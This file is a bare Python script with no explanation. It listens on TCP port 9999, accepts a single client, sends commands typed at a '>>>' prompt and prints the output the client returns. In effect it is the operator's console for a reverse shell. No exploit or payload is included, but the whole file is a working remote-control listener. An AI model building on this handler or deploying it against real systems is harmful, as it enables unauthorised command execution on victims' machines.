import socket
import sys

def socket_create():
    try:
        global host
        global port
        global server
        host = ''
        port = 9999
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global server
        server.bind((host, port))
        server.listen(1)
        print(f"Listening on port {port}")
    except socket.error as msg:
        print(f"Binding error: {msg}")
        socket_bind()

def socket_accept():
    global client
    global addr
    print(f'[+] Listening as {host}:{port}')
    client, addr = server.accept()
    print(f'[+] Client connected {addr}')
    client.send('Connected'.encode())
    send_commands(client)
    client.close()

def send_commands(client):
    while True:
        cmd = input('>>> ')
        client.send(cmd.encode())

        if cmd.lower() in ['quit', 'exit', 'x', 'q']:
            break

        response = client.recv(1024).decode()
        print(response)

def main():
    socket_create()
    socket_bind()
    socket_accept()

if __name__ == '__main__':
    main()
